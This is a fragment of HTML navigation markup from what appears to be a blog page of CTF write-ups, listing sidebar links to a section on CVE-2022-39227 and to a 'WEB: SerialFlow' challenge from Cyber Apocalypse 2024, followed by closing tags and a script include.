left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->V·ªÅ CVE-2022-39227<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blogs/CTF/2024/cyber-apocalypse-2024.html#web-serialflow" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="WEB: SerialFlow"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->WEB: SerialFlow<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--></ul></div></main><!--]--></div></div><!--[--><!----><!----><!--]--><!--]--></div>
    <script type="module" src="/assets/app-BJjiZhLy.js" defer></script>
  </body>
</html>
